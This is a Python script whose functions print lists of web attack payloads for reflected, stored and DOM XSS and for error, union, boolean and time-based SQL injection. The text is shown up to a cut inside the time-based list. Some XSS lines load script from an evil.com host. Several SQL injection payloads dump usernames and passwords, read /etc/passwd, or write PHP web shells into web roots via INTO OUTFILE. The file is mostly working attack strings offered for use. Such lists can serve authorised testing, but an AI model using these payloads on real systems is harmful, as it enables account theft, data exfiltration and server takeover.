import sys
import base64
import urllib.parse




def help():
    print('''Available Options are : \n--xss --reflected\n--xss --stored\n--xss --dom\n--sqli --error\n--sqli --union\n--sqli --boolean\n--sqli --time\n--linux\n--windows\nFor encoding type (--encode)\nFor Bypassing techniques (--bypassingTechniques)''')
    

def reflected_xss_payloads():
    print("===Reflected XSS Payloads===")
    list_of_reflected_payloads = [
    "<script>alert(1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<script>confirm('XSS')</script>",
    "<script>prompt(1)</script>",
    "<script>console.log('XSS')</script>",
    "<script>alert(document.domain)</script>",
    "<script>alert(document.cookie)</script>",
    "<script>alert(navigator.userAgent)</script>",
    "<script>alert(window.location)</script>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<input onfocus=alert(1) autofocus>",
    "<video src onerror=alert(1)>",
    "<audio src onerror=alert(1)>",
    "<marquee onstart=alert(1)>XSS</marquee>",
    "<a href='javascript:alert(1)'>Click</a>",
    "<div onclick=alert(1)>Click me</div>",
    "<IMG SRC='javascript:alert(1)'>",
    "<IMG SRC=JaVaScRiPt:alert(1)>",
    "<IMG SRC=`javascript:alert(\"XSS\")`>",
    "<IMG SRC=x onerror=\"alert(1)\">",
    "<IMG ONERROR=alert(1) SRC=>",
    "<img src=1 onerror=alert(1)//>",
    "<img src=x: onerror=alert(1)>",
    "<img src=# onerror=alert(1)>",
    "<img src='data:image/svg+xml,<svg onload=alert(1)>'>",
    "<img src='x' onerror='javascript:alert(1)'>",
    "<script>eval('alert(1)')</script>",
    "<script>setTimeout('alert(1)',100)</script>",
    "<script>setInterval('alert(1)',1000)</script>",
    "<script>Function('alert(1)')()</script>",
    "<script>new Function('alert(1)')()</script>",
    "<script>window </script>",
    "<script>top </script>",
    "<script>self </script>",
    "<script>this </script>",
    "<script>(function(){alert(1)})()</script>",
    "<div style=\"width:expression(alert(1));\">",
    "<form onsubmit=alert(1)><input type=submit></form>",
    "<details open ontoggle=alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<button onclick=alert(1)>Click</button>",
    "<textarea onfocus=alert(1)>XSS</textarea>",
    "<select onchange=alert(1)><option>XSS</option></select>",
    "<table background='javascript:alert(1)'>",
    "<base href='javascript:alert(1);//'>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<script>/*alert*/(1)</script>",
    "<script>\\u0061lert(1)</script>",
    "<script>&#97;lert(1)</script>",
    "<svg><script>alert(1)</script></svg>",
    "<script src=data:text/javascript,alert(1)></script>",
    "<script>alert`1`</script>",
    "<script>alert/*XSS*/(1)</script>",
    "<script>alert&#40;1&#41;</script>",
    "<!--><script>alert(1)</script>",
    "<!-- --><script>alert(1)</script>",
    "</script><script>alert(1)</script>",
    "</title><script>alert(1)</script>",
    "';alert(1);//",
    "\";alert(1);//",
    "'';!--\"<XSS>=&{()}",
    "<scr<script>ipt>alert(1)</script>",
    "<SCRIPT/XSS>alert(\"XSS\")</SCRIPT>",
    "<SCRIPT SRC='http://evil.com/xss.js'></SCRIPT>",
    "<a href='javascript:alert(1)'>XSS</a>",
    "<a href='data:text/html,<script>alert(1)</script>'>XSS</a>",
    "<a href='vbscript:msgbox(\"XSS\")'>XSS</a>",
    "<a href='javas&#99;ript:alert(1)'>click</a>",
    "<a href='jav&#x09;ascript:alert(1)'>click</a>",
    "<a href='jav&#x0A;ascript:alert(1)'>click</a>",
    "<a href='jav&#x0D;ascript:alert(1)'>click</a>",
    "<a href='jav\tascript:alert(1)'>click</a>",
    "<a href='java\u0000script:alert(1)'>click</a>",
    "<a href='javascript    :alert(1)'>click</a>",
    "<<script>alert(1)//<</script>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    "<script<<>>alert(1)</script>",
    "<script><script>alert(1)</script></script>",
    "<script src='//evil.com/xss.js'></script>",
    "<script src='data:text/javascript,alert(1)'></script>",
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
    "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
    "<math href='javascript:alert(1)'>",
    "<script>alert(document.URL)</script>"
]

    for payloads in list_of_reflected_payloads:
        print(payloads)




def stored_xss_payloads():
    print("===Stored XSS Payloads===")
    list_of_stored_xss_payloads = [
    "<script>alert('XSS')</script>",
    "<script>confirm('Stored XSS')</script>",
    "<script>prompt('Stored')</script>",
    "<script>alert(document.cookie)</script>",
    "<script>alert(document.domain)</script>",
    "<script>alert(window.location)</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<script>alert(navigator.userAgent)</script>",
    "<script>console.log('XSS')</script>",
    "<script>document.write('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<video src onerror=alert('XSS')>",
    "<audio src onerror=alert('XSS')>",
    "<marquee onstart=alert('XSS')>XSS</marquee>",
    "<input onfocus=alert('XSS') autofocus>",
    "<div onclick=alert('XSS')>Click me</div>",
    "<button onclick=alert('XSS')>Click</button>",
    "<div style=\"width:expression(alert('XSS'));\">",
    "<style>@import 'javascript:alert(\"XSS\")';</style>",
    "<style>body{background:url('javascript:alert(\"XSS\")')}</style>",
    "<object data=javascript:alert('XSS')></object>",
    "<embed src=javascript:alert('XSS')>",
    "<link rel=stylesheet href='javascript:alert(\"XSS\")'>",
    "<base href='javascript:alert(1);//'>",
    "<form onsubmit=alert('XSS')><input type=submit></form>",
    "<table background='javascript:alert(\"XSS\")'>",
    "<img src='data:image/svg+xml,<svg onload=alert(1)>'>",
    "<a href='javascript:alert(\"XSS\")'>Click</a>",
    "<textarea onfocus=alert('XSS') autofocus></textarea>",
    "<select onchange=alert('XSS')><option>XSS</option></select>",
    "<input type='text' value='XSS' onmouseover='alert(\"XSS\")'>",
    "<img src='x' onerror='alert(\"XSS\")'>",
    "<iframe onload='alert(\"XSS\")'></iframe>",
    "<div onmouseenter='alert(\"XSS\")'>Hover</div>",
    "<div onmouseleave='alert(\"XSS\")'>Leave</div>",
    "<img src='x' onabort='alert(\"XSS\")'>",
    "<div oncopy='alert(\"XSS\")'>Copy this</div>",
    "&lt;script&gt;alert('XSS')&lt;/script&gt;",
    "<script>&#x61;lert('XSS')</script>",
    "<script>alert&#40;'XSS'&#41;</script>",
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    "<script>/* XSS */ alert('Stored')</script>",
    "<script>setTimeout('alert(\"XSS\")',100)</script>",
    "<script>Function('alert(\"XSS\")')()</script>",
    "<script>new Function('alert(\"XSS\")')()</script>",
    "<script>top.location='javascript:alert(\"XSS\")'</script>",
    "<script>window.location='javascript:alert(\"XSS\")'</script>",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "</script><script>alert('XSS')</script>",
    "<script><script>alert('XSS')</script></script>",
    "<script src='//evil.com/xss.js'></script>",
    "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
    "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>",
    "<math href='javascript:alert(1)'>",
    "<script>alert(document.URL)</script>",
    "<script>alert(1)//</script>",
    "<b onmouseover=alert('XSS')>Bold Text</b>",
    "<u onclick=alert('XSS')>Underlined</u>",
    "<i onfocus=alert('XSS')>Italic</i>",
    "<img src=1 onerror=alert('Stored XSS')>",
    "<div style=\"animation-name:x;\" onanimationstart=\"alert('XSS')\">test</div>",
    "<iframe src=\"data:text/html,<script>alert('XSS')</script>\"></iframe>",
    "<script src=data:text/javascript,alert(1)></script>",
    "<img src='x' onerror=alert('XSS') title='x'>",
    "<img src=1 onerror=alert(1)//>",
    "<img src=x: onerror=alert(1)>",
    "<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>",
    "<script>document.write('<svg onload=alert(1)>')</script>",
    "<script>window.onload = function(){ alert('XSS') }</script>",
    "<script>window.addEventListener('load', function(){ alert('XSS') });</script>",
    "<script>document.addEventListener('DOMContentLoaded',()=>{alert('XSS')})</script>",
    "<script>if(document.body)alert('XSS')</script>",
    "<script>window.setTimeout('alert(\"XSS\")',0);</script>",
    "<script>document.querySelector('body').innerHTML += '<img src=x onerror=alert(1)>';</script>",
    "<script>document.body.insertAdjacentHTML('beforeend','<img src=x onerror=alert(1)>')</script>",
    "<script>window.name='XSS'; alert(window.name)</script>",
    "{\"name\":\"<script>alert('XSS')</script>\"}",
    "{\"desc\":\"<img src=x onerror=alert(1)>\"}",
    "{\"bio\":\"<svg/onload=alert(1)>\"}",
    "{\"comment\":\"<iframe srcdoc='<script>alert(1)</script>'></iframe>\"}",
    "{\"status\":\"<script>alert(document.cookie)</script>\"}",
    "{\"html\":\"<div onclick=alert(1)>Click me</div>\"}",
    "{\"message\":\"<marquee onstart=alert(1)>Hi</marquee>\"}",
    "{\"code\":\"<script>alert(1)</script>\"}",
    "{\"payload\":\"<img src=x onerror=alert('Stored XSS')>\"}",
    "{\"xss\":\"<input autofocus onfocus=alert(1)>\"}"
]

    for payloads in list_of_stored_xss_payloads:
        print(payloads)




def dom_xss_payloads():
    print("===DOM XSS Payloads===")
    list_of_dom_xss_payloads = [
    "<script>location='javascript:alert(1)'</script>",
    "<img src=x onerror='location=`javascript:alert(1)`'>",
    "javascript:alert(1)",
    "#<script>alert(1)</script>",
    "#<img src=x onerror=alert(1)>",
    "#\"><script>alert(1)</script>",
    "#';alert(1)//",
    "#\"><img src=x onerror=alert(1)>",
    "#<svg/onload=alert(1)>",
    "#<body onload=alert(1)>",
    "<script>document.URL='javascript:alert(1)'</script>",
    "<script>document.location='javascript:alert(1)'</script>",
    "<script>document.documentURI='javascript:alert(1)'</script>",
    "<script>alert(document.URL)</script>",
    "<script>alert(document.referrer)</script>",
    "<script>alert(location.hash)</script>",
    "<script>alert(window.name)</script>",
    "<script>alert(location.search)</script>",
    "<script>alert(document.baseURI)</script>",
    "<script>window.location.hash='#<img src=x onerror=alert(1)>'</script>",
    "<script>eval('alert(1)')</script>",
    "<script>setTimeout('alert(1)', 100)</script>",
    "<script>setInterval('alert(1)', 1000)</script>",
    "<script>Function('alert(1)')()</script>",
    "<script>new Function('alert(1)')()</script>",
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
    "<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>",
    "<script>location.hash='<img src=x onerror=alert(1)>'</script>",
    "<script>location.href='javascript:alert(1)'</script>",
    "<script>window['alert']('DOM')</script>",
    "#<script>alert(1)</script>",
    "#\"><script>alert(1)</script>",
    "#<img src=x onerror=alert(1)>",
    "#<svg/onload=alert(1)>",
    "#<iframe src='javascript:alert(1)'></iframe>",
    "#<a href='javascript:alert(1)'>click</a>",
    "#\" onmouseover=alert(1)",
    "#' onerror=alert(1)",
    "#--><script>alert(1)</script>",
    "#<details open ontoggle=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<img src=x onerror=alert(1)>",
    "<div onmouseover=alert(1)>hover</div>",
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
    "<script>document.body.innerHTML+='<svg onload=alert(1)>'</script>",
    "<script>document.querySelector('div').innerHTML='<img src=x onerror=alert(1)>'</script>",
    "<script>document.body.insertAdjacentHTML('afterbegin','<img src=x onerror=alert(1)>')</script>",
    "<script>document.querySelector('body').innerHTML='<img src=x onerror=alert(1)>'</script>",
    "<script>document.querySelector('#app').innerHTML='<svg onload=alert(1)>'</script>",
    "<script>document.getElementById('target').innerHTML='<img src=x onerror=alert(1)>'</script>",
    "<a href='javascript:alert(1)'>Click</a>",
    "<link rel=stylesheet href='javascript:alert(1)'>",
    "<body background='javascript:alert(1)'>",
    "<form action='javascript:alert(1)'><input type=submit></form>",
    "<object data='javascript:alert(1)'></object>",
    "<embed src='javascript:alert(1)'>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<input type='image' src='javascript:alert(1)'>",
    "<base href='javascript:alert(1)//'>",
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    "<div id=x></div><script>x=document.getElementById('x');x.setAttribute('onclick','alert(1)');x.click()</script>",
    "<script>var d=document.createElement('img');d.src='x';d.onerror=function(){alert(1)};document.body.appendChild(d);</script>",
    "<script>let el = document.createElement('iframe'); el.src='javascript:alert(1)'; document.body.appendChild(el);</script>",
    "<script>let x=document.createElement('img');x.onerror=()=>alert(1);x.src='x';document.body.appendChild(x);</script>",
    "<script>let i=document.createElement('img');i.setAttribute('src','x');i.setAttribute('onerror','alert(1)');document.body.appendChild(i);</script>",
    "<script>let x='<img src=x onerror=alert(1)>';document.body.innerHTML+=x;</script>",
    "<script>location.hash='<svg onload=alert(1)>'</script>",
    "<script>history.pushState('', '', '#<img src=x onerror=alert(1)>')</script>",
    "<script>let url=decodeURIComponent(location.hash.substr(1));eval(url)</script> # payload: #%61lert(1)",
    "<script>new Image().src='x';</script>",
    "<script src='data:text/javascript,alert(1)'></script>",
    "<script src='//evil.com/poc.js'></script>",
    "<script src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></script>",
    "<script>fetch('javascript:alert(1)')</script>",
    "<script>window.open('javascript:alert(1)')</script>",
    "<script>window.location.assign('javascript:alert(1)')</script>",
    "<script>navigator.sendBeacon('javascript:alert(1)')</script>",
    "<script>new Worker('javascript:alert(1)')</script>",
    "<script>postMessage('javascript:alert(1)', '*')</script>",
    "<script>document.write(location.hash.slice(1))</script> # payload in hash: <img src=x onerror=alert(1)>"
]

    for payloads in list_of_dom_xss_payloads:
        print(payloads)


def error_sqli():
    print("===Error Based SQLi Payloads===")
    list_of_error_payloads = [
    "' AND 1=CONVERT(int,'test')--",
    "' AND 1=CAST('a' AS INT)--",
    "' AND 1=1 GROUP BY CONCAT(version(),FLOOR(RAND(0)*2))--",
    "' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--",
    "' AND updatexml(null,concat(0x3a,user(),0x3a),null)--",
    "' AND extractvalue(1,concat(0x3a,(SELECT database())))--",
    "' AND extractvalue(1,concat(0x3a,(SELECT user()),0x3a))--",
    "' AND name=1 LIMIT 1 PROCEDURE analyse(extractvalue(rand(),concat(0x3a,user())),1)--",
    "' AND 1 GROUP BY CONCAT((SELECT database()),FLOOR(RAND(0)*2))--",
    "' AND 1 GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))--",
    "' AND updatexml(1,concat(0x3a,@@version,0x3a),1)--",
    "' AND updatexml(1,concat(0x3a,database(),0x3a),1)--",
    "' AND updatexml(1,concat(0x3a,user(),0x3a),1)--",
    "' AND extractvalue(1,concat(0x3a,version(),0x3a))--",
    "' AND extractvalue(1,concat(0x3a,database(),0x3a))--",
    "' AND extractvalue(1,concat(0x3a,current_user(),0x3a))--",
    "' AND extractvalue(1,concat(0x3a,@@datadir,0x3a))--",
    "' AND extractvalue(1,concat(0x3a,(SELECT table_name FROM information_schema.tables LIMIT 1),0x3a))--",
    "' AND updatexml(1,concat(0x3a,(SELECT table_name FROM information_schema.tables LIMIT 1),0x3a),1)--",
    "' AND updatexml(1,concat(0x3a,(SELECT table_schema FROM information_schema.tables LIMIT 1),0x3a),1)--",
    "' UNION SELECT 1,2,3,CONCAT('~',user(),'~')--",
    "' UNION SELECT 1,2,3,@@version--",
    "' UNION SELECT NULL, NULL, NULL, CONCAT(user(), ':', database())--",
    "' UNION SELECT table_name, NULL, NULL FROM information_schema.tables--",
    "' UNION SELECT NULL, NULL, version()--",
    "' UNION SELECT NULL, NULL, database()--",
    "' UNION SELECT NULL, NULL, user()--",
    "' UNION SELECT NULL, NULL, @@hostname--",
    "' UNION SELECT NULL, NULL, @@datadir--",
    "' UNION SELECT NULL, NULL, session_user()--",
    "' AND 1=2 UNION SELECT NULL, version(), NULL--",
    "' AND 1=1 AND extractvalue(1, concat(CHAR(126), database(), CHAR(126)))--",
    "' AND 1=1 AND updatexml(1, concat(CHAR(126), user(), CHAR(126)), 1)--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND()*2)) AS x FROM information_schema.tables GROUP BY x) y)--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(user(), FLOOR(RAND()*2)) AS x FROM information_schema.tables GROUP BY x) y)--",
    "' AND (SELECT updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1),0x7e),1))--",
    "' AND (SELECT extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1),0x7e)))--",
    "' AND (SELECT name FROM mysql.user WHERE user=CHAR(114,111,111,116))--",
    "' AND 1=1 ORDER BY updatexml(1,concat(0x7e,version(),0x7e),1)--",
    "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null)x)--",
    "' AND 1/0--",
    "' AND (SELECT 1/(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()))--",
    "' AND 1=1 AND 1/0--",
    "' AND 1=2 AND 1/0--",
    "' OR 1=1 AND 1/0--",
    "' OR 1=2 AND 1/0--",
    "' AND 0=1 OR 1/0--",
    "' AND (SELECT 1/0 FROM dual)--",
    "' AND IF(1=1,1/0,1)--",
    "' AND (SELECT 1/0 FROM information_schema.tables)--",

    # With benchmarking
    "' AND BENCHMARK(1000000,MD5('test'))--",
    "' AND IF(1=1,BENCHMARK(1000000,MD5('A')),0)--",
    "' AND IF(1=2,BENCHMARK(1000000,MD5('B')),0)--",
    "' AND IF(user() LIKE '%root%',BENCHMARK(1000000,MD5('x')),0)--",
    "' AND IF((SELECT LENGTH(user()))>0,BENCHMARK(1000000,MD5('x')),0)--",
    "' AND IF(EXISTS(SELECT * FROM users),BENCHMARK(1000000,MD5('x')),0)--",
    "' AND IF(NOT EXISTS(SELECT * FROM users),BENCHMARK(1000000,MD5('x')),0)--",
    "' AND IF((SELECT LENGTH(database()))>5,BENCHMARK(1000000,MD5('x')),0)--",
    "' AND IF((SELECT ASCII(SUBSTRING(database(),1,1)))=115,BENCHMARK(1000000,MD5('x')),0)--",
    "' AND IF((SELECT COUNT(*) FROM users)>0,BENCHMARK(1000000,MD5('x')),0)--",

    # For Oracle-style or MSSQL
    "' AND 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND 1=1)--",
    "' AND 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND 1=0)--",
    "' UNION SELECT banner, NULL FROM v$version--",
    "' UNION SELECT name, password FROM sys.syslogins--",
    "' UNION SELECT NULL, name FROM master.dbo.sysdatabases--",
    "' AND EXISTS(SELECT * FROM dual WHERE 1=1)--",
    "' AND NOT EXISTS(SELECT * FROM dual WHERE 1=1)--",
    "' AND EXISTS(SELECT table_name FROM all_tables WHERE ROWNUM=1)--",
    "' UNION SELECT table_name, column_name FROM all_tab_columns WHERE ROWNUM=1--",
    "' AND 1=(SELECT COUNT(*) FROM dual WHERE dbms_lob.getlength('abc')=3)--",

    # Custom crafted info extractors
    "' AND updatexml(1,CONCAT(CHAR(126),(SELECT table_name FROM information_schema.tables LIMIT 1),CHAR(126)),1)--",
    "' AND updatexml(1,CONCAT(CHAR(126),(SELECT column_name FROM information_schema.columns LIMIT 1),CHAR(126)),1)--",
    "' AND extractvalue(1,CONCAT(CHAR(126),(SELECT user()),CHAR(126)))--",
    "' AND extractvalue(1,CONCAT(CHAR(126),(SELECT database()),CHAR(126)))--",
    "' AND extractvalue(1,CONCAT(CHAR(126),(SELECT version()),CHAR(126)))--",
    "' AND extractvalue(1,CONCAT(CHAR(126),(SELECT table_schema FROM information_schema.tables LIMIT 1),CHAR(126)))--",
    "' AND extractvalue(1,CONCAT(CHAR(126),(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),CHAR(126)))--",
    "' AND extractvalue(1,CONCAT(CHAR(126),(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),CHAR(126)))--",
    "' AND updatexml(1,CONCAT(CHAR(126),(SELECT @@global.version),CHAR(126)),1)--",
    "' AND updatexml(1,CONCAT(CHAR(126),(SELECT @@hostname),CHAR(126)),1)--"
]

    for payloads in list_of_error_payloads:
        print(payloads)




def union_sqli():
    print("===Union Based SQLi Payloads===")
    list_of_union_payloads =  [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT 1,2,3,4--",
    "' UNION SELECT 1,2,3,4,5--",
    "' UNION SELECT 1,2,3,4,5,6--",
    "' UNION SELECT 1,2,3,4,5,6,7--",
    "' UNION SELECT 1,2,3,4,5,6,7,8--",

    "' UNION SELECT 1,@@version--",
    "' UNION SELECT 1,database()--",
    "' UNION SELECT 1,user()--",
    "' UNION SELECT version(),user(),database()--",
    "' UNION SELECT current_user(),session_user(),system_user()--",
    "' UNION SELECT 1,2,3,4,5,@@datadir--",
    "' UNION SELECT 1,2,3,4,5,@@hostname--",
    "' UNION SELECT now(),user(),database()--",
    "' UNION SELECT length(user()),length(database()),length(version())--",
    "' UNION SELECT concat(user(),\":\",database()),2,3--",

    "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
    "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--",
    "' UNION SELECT table_schema,table_name,NULL FROM information_schema.tables--",
    "' UNION SELECT group_concat(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()--",
    "' UNION SELECT group_concat(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='users'--",
    "' UNION SELECT column_name,data_type,NULL FROM information_schema.columns WHERE table_name='users'--",
    "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--",
    "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_schema=database()--",
    "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='admin'--",
    "' UNION SELECT group_concat(schema_name),NULL,NULL FROM information_schema.schemata--",

    "' UNION SELECT username,password FROM users--",
    "' UNION SELECT login,pass FROM users--",
    "' UNION SELECT email,password FROM users--",
    "' UNION SELECT user,pass FROM users--",
    "' UNION SELECT name,md5(pass) FROM users--",
    "' UNION SELECT id,concat(username,0x3a,password) FROM users--",
    "' UNION SELECT id,group_concat(username,\":\",password) FROM users--",
    "' UNION SELECT id,CONCAT_WS(':',username,password) FROM users--",
    "' UNION SELECT user,password FROM mysql.user--",
    "' UNION SELECT host,user FROM mysql.user--",

    "'%20UNION%20SELECT%201,2,3--+",
    "'/**/UNION/**/SELECT/**/1,2,3--+",
    "' UNION SELECT 1,2,3 #",
    "' UNION SELECT 1,2,3 /*",
    "'/*!12345UNION*/ SELECT 1,2,3--",
    "'UNION%0ASELECT%0A1,2,3--",
    "'UNION+SELECT+1,2,3--",
    "'||(SELECT 1,2,3)--",
    "' UNION SELECT CHAR(65,66,67),2,3--",
    "'UnIoN SeLeCt 1,2,3--",

    "' UNION SELECT '<h1>Injected</h1>',2,3--",
    "' UNION SELECT '<script>alert(1)</script>',2,3--",
    "' UNION SELECT 'Success',2,3--",
    "' UNION SELECT concat_ws(':','a','b'),2,3--",
    "' UNION SELECT md5(1234),2,3--",
    "' UNION SELECT sha1(1234),2,3--",
    "' UNION SELECT hex('abc'),2,3--",
    "' UNION SELECT 0x616263,2,3--",
    "' UNION SELECT REPEAT('a',100),2,3--",
    "' UNION SELECT LPAD('X',100,'X'),2,3--",

    "' UNION SELECT (SELECT table_name FROM information_schema.tables LIMIT 1),2,3--",
    "' UNION SELECT (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),2,3--",
    "' UNION SELECT (SELECT user FROM mysql.user LIMIT 1),2,3--",
    "' UNION SELECT (SELECT database()),2,3--",
    "' UNION SELECT (SELECT version()),2,3--",
    "' UNION SELECT (SELECT count(*) FROM users),2,3--",
    "' UNION SELECT (SELECT table_schema FROM information_schema.tables LIMIT 1),2,3--",
    "' UNION SELECT (SELECT max(length(password)) FROM users),2,3--",
    "' UNION SELECT (SELECT min(id) FROM users),2,3--",
    "' UNION SELECT (SELECT concat(user,password) FROM users LIMIT 1),2,3--",

    "' UNION SELECT 1/0,2,3--",
    "' UNION SELECT 1,1/0,3--",
    "' UNION SELECT null,CONCAT(1/0),null--",
    "' UNION SELECT IF(1=1,'YES','NO'),2,3--",
    "' UNION SELECT IF(1=2,'YES','NO'),2,3--",
    "' UNION SELECT CASE WHEN (1=1) THEN 'OK' ELSE 'NO' END,2,3--",
    "' UNION SELECT CAST(version() AS CHAR),2,3--",
    "' UNION SELECT 1,2,(SELECT version())--",
    "' UNION SELECT 1,2,(SELECT length(database()))--",
    "' UNION SELECT 1,2,(SELECT 1 FROM dual WHERE 1=1)--",

    "' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--",
    "' UNION SELECT LOAD_FILE('C:/boot.ini'),2,3--",
    "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>',2,3 INTO OUTFILE '/var/www/html/shell.php'--",
    "' UNION SELECT '<?php passthru($_GET[\"cmd\"]); ?>',2,3 INTO OUTFILE '/tmp/cmd.php'--",
    "' UNION SELECT \"<?php echo shell_exec($_GET['cmd']); ?>\",2,3 INTO OUTFILE '/var/www/html/cmd.php'--",
    "' UNION SELECT \"<?php eval($_GET['x']); ?>\",2,3 INTO OUTFILE '/var/www/html/x.php'--",
    "' UNION SELECT \"<?php phpinfo(); ?>\",2,3 INTO OUTFILE '/var/www/html/info.php'--",
    "' UNION SELECT 1,2,3 INTO DUMPFILE '/tmp/dump.txt'--",
    "' UNION SELECT \"<?php die('hacked'); ?>\",2,3 INTO OUTFILE '/var/www/html/test.php'--",
    "' UNION SELECT 1,'<?php @eval($_POST[\"a\"]); ?>',3 INTO OUTFILE '/var/www/html/shell2.php'--",

    "' UNION SELECT /* comment */ 1,2,3--",
    "' UNION SELECT /*!12345 1*/,2,3--",
    "' UNION SELECT /*!SELECT*/ 1,2,3--",
    "' UNION SELECT 1,CONCAT_WS(':',user(),database()),3--",
    "' UNION SELECT CHAR(117,115,101,114),CHAR(112,119,100),3--",
    "' UNION SELECT 0x75736572,0x70617373,3--",
    "' UNION SELECT 1,2,@@global.version_compile_os--",
    "' UNION SELECT 1,2,@@innodb_version--",
    "' UNION SELECT 1,2,@@port--",
    "' UNION SELECT 1,2,@@tmpdir--"
]

    for payloads in list_of_union_payloads:
        print(payloads)


def Boolean_sqli():
    print("===Boolean Based SQLi Payloads===")
    list_of_boolean_payloads =  [
    "' AND 1=1--",
    "' AND 1=2--",
    "' OR 1=1--",
    "' OR 1=2--",
    "' AND '1'='1'--",
    "' AND '1'='2'--",
    "\" AND '1'='1'--",
    "\" AND '1'='2'--",
    "' AND (SELECT 1)=1--",
    "' AND (SELECT 1)=2--",

    "' AND EXISTS(SELECT * FROM users)--",
    "' AND NOT EXISTS(SELECT * FROM users)--",
    "' AND ASCII(SUBSTRING(@@version,1,1))=5--",
    "' AND ASCII(SUBSTRING(@@version,1,1))=4--",
    "' AND LENGTH(database())=8--",
    "' AND LENGTH(database())=5--",
    "' AND (SELECT COUNT(*) FROM users)>0--",
    "' AND (SELECT COUNT(*) FROM users)<0--",
    "' AND (SELECT username FROM users LIMIT 1)='admin'--",
    "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",

    "' AND 1=1#",
    "' AND 1=2#",
    "' AND 1=1/*",
    "' AND 1=2/*",
    "' AND 'a'='a'--",
    "' AND 'a'='b'--",
    "' OR 'a'='a'--",
    "' OR 'a'='b'--",
    "admin' AND 1=1--",
    "admin' AND 1=2--",

    "' AND TRUE--",
    "' AND FALSE--",
    "' AND 1 LIKE 1--",
    "' AND 1 LIKE 2--",
    "' AND 1 BETWEEN 1 AND 2--",
    "' AND 1 BETWEEN 2 AND 3--",
    "' AND 1 IN (1,2)--",
    "' AND 1 IN (3,4)--",
    "' AND 1 IS NOT NULL--",
    "' AND 1 IS NULL--",

    "' AND (SELECT 1 FROM dual WHERE EXISTS(SELECT * FROM users))--",
    "' AND (SELECT 1 FROM dual WHERE NOT EXISTS(SELECT * FROM users))--",
    "' AND (SELECT 1 WHERE 1=1)--",
    "' AND (SELECT 1 WHERE 1=2)--",
    "' OR EXISTS(SELECT * FROM users)--",
    "' OR NOT EXISTS(SELECT * FROM users)--",
    "' AND ASCII(SUBSTRING((SELECT user()),1,1)) > 64--",
    "' AND ASCII(SUBSTRING((SELECT user()),1,1)) < 64--",
    "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1--",
    "' AND (SELECT CASE WHEN (1=2) THEN 1 ELSE 0 END)=1--"
]

    for payloads in list_of_boolean_payloads:
        print(payloads)




def time_sqli():
    print("===Time Based SQLi Payloads===")
    list_of_time_payloads =  [
    "' AND SLEEP(5)--",
    "' AND SLEEP(0)--",
    "' AND IF(1=1,SLEEP(5),0)--",
    "' AND IF(1=2,SLEEP(5),0)--",
    "' OR IF(1=1,SLEEP(5),0)--",
    "' OR IF(1=2,SLEEP(5),0)--",
    "' AND IF(ASCII(SUBSTRING(@@version,1,1))=5,SLEEP(5),0)--",
    "' AND IF(ASCII(SUBSTRING(@@version,1,1))=4,SLEEP(5),0)--",
    "' AND IF(LENGTH(database())=8,SLEEP(5),0)--",
    "' AND IF(LENGTH(database())=5,SLEEP(5),0)--",

    "' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--",
    "' AND IF((SELECT COUNT(*) FROM users)=0,SLEEP(5),0)--",
    "' AND IF((SELECT user())='root@localhost',SLEEP(5),0)--",
